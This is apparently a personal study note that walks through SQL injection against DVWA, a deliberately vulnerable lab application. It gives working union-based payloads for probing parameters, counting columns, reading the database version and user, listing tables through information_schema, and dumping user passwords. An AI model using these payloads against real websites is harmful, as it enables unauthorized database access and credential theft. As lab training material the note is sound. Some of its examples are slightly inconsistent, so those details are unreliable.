
It is essential to understand that any endpoint can be vulnerable to SQL injection attacks when proper data sanitization is not implemented or when user input is blindly trusted. SQL injection occurs when malicious SQL statements are inserted into user input, potentially leading to unauthorized access or manipulation of the database.

Here listed are the steps to find the sql injection vulnerability on a website:

### Step 1
***So our first step is to find the parameters that transport our data to the server***

$example$
consider a url:

`http://192.168.29.153/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#`

observe the part `/?id=1&Submit=Submit` don't you think these are the parameters that are transporting the data to the server? , if yes then our first step is done , find the parameters
and this is how the endpoint looks:
![[Pasted image 20230615162032.png]]

### Step 2
***Breaking the query***
we fuzz our parameters with the different types of input ranging from  basic characters to full fledged sql queries

why we doing this: is to get a confirmation that it is vulnerable o sql injection
we start by giving it a single quotation mark as a basic payload to confirm so:
`'` at this position: `/?id=1'`
like this: 
`http://192.168.29.153/DVWA/vulnerabilities/sqli/?id=1'&Submit=Submit#` 

the error would come if the input isn't sanitized and in our case it looks like this:
![[Pasted image 20230615162718.png]]

these errors are very helpful for further process , as they sometimes tell us what query is running inside the back-end of the server 

### Step 3
***Joining the query***
Now we know that it is vulnerable we can actually go and try to now inject our payload to exfiltrate the data from the server on the webpage

 * Understanding the flow
 
	 we need to understand now in the back-end how the query is working and how to break it. We do that by looking at how our parameters are being sent , in the string format or in the other format
	
	[#] string format - 
	the string format type looks like this at backend:
	`Select attribute from users where id='$id';`
	so when we inject our payload we control the values inside the string we need to make sure to end the string so that our payload doesn't gets treated as a string but rather as another query to be executed , we can achieve this by adding a single quotation  to end the string example:
	`id=1' union all select * from users;--*`
	
	which on the url will look like this:
	`http://192.168.29.153/DVWA/vulnerabilities/sqli/?id=1' union all select * from table;--*&Submit=Submit#`
	
	and at the back-end will look like this:
	`select attribute from users where id='1' union all select * from users;--`

	*I am displaying this url to you in raw format , encode this url to execute the query*
	
	NOTE: we used -- at the last of our query to comment out the rest of the query being processed by the server and end there only , if you're using sql where the comments are different try different characters

	[#] other format than integer - 
	let's say that the query is taking the integer format for the `id` parameter , it will look like this at the backend:
	`select attribute from users where id=$id`
	In that case we don't need to add the single quote to the payload to execute our query 
	like:
	`id=1 union select attribute from users;--`
	
	the url will look like this:
	`http://192.168.29.153/DVWA/vulnerabilities/sqli/?id=1 union all select * from table;--*&Submit=Submit#`
	
	and at the backend like this:
	`select attribute from users where id='1' union all select * from users;--`

### Step 4
***Finding the numbers of columns***
 Finding the number of columns can be a tiring approach as it involves trial and error , we use the `order by` clause to do so:

*we insert the payload with the order by clause following a random number representing the column number to order by it to*

Till where we don't get the error we get the number of columns the table has 
like:
the payload will look like this:
`id=1 ' order by 3; #` since we had string based sql parameter and our comment was '#'
and when the table number exceeds the error is somewhat like this:
![[Pasted image 20230616141700.png]]
and if we get no error we increase the number from 3 to some other and if we get some error we decrease the number till we get no error , which will tell us exact number of column
the url looks like this encoded:
`http://192.168.29.153/DVWA/vulnerabilities/sqli/?id=1+%27+order+by+2+%23&Submit=Submit#`
and this looks like this:
![[Pasted image 20230616141731.png]]

### Step 5
***Finding where our  data will be displayed***

Now since we we got the number of columns we are now ready to try our payload and test the website to check leakage of data
but the question comes where we will get our data displayed , we need to check this also:
we can do this via `union` clause and select by printing exact numbers of columns we found above:

the payload: `id=1 ' union select 1,2 #` 
in our case the comment was '#'
here we found there were 2 payloads . Also the response will show us where will the values be reflected like:
*normal*:
![[Pasted image 20230616140522.png]]

*injection*:
![[Pasted image 20230616140937.png]]

now we know that where the data will be reflected , so we can now start injecting the payloads

### Step 5
Payloads injection:
when we know the position and the function to execute we can get pretty serious information about the database like:
![[Pasted image 20230616141246.png]]
the version and the current user with the query:
`1 ' union select version(),user() #`

which in the url format looks like:
`http://192.168.29.153/DVWA/vulnerabilities/sqli/?id=1+%27+union+select+version%28%29%2Cuser%28%29+%23&Submit=Submit#`

If you don't know what these functions are you can refer to:
[[Finding sensitive-system info With SQL]]

Since we don't know the tables and columns we can start by getting the database name from information_schema , you can find this here for further info: [[Black Box Approach using information_schema]]
![[Pasted image 20230616141955.png]]

similarly:
we get the tables:
![[Pasted image 20230616142144.png]]
`users` and `guestbook`

we then dump all the columns:
`1 '  union select column_name, data_type FROM information_schema.columns WHERE table_schema = 'dvwa'   AND table_name = 'users' #`
![[Pasted image 20230616142428.png]]

Thus now we can fetch any data from the above info :
`1 ' union select first_name,password from dvwa.users #`

![[Pasted image 20230616142655.png]]